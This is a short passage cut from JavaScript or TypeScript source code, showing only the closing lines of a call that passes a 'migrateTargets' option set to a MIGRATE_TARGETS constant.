    migrateTargets: MIGRATE_TARGETS,
  });
}
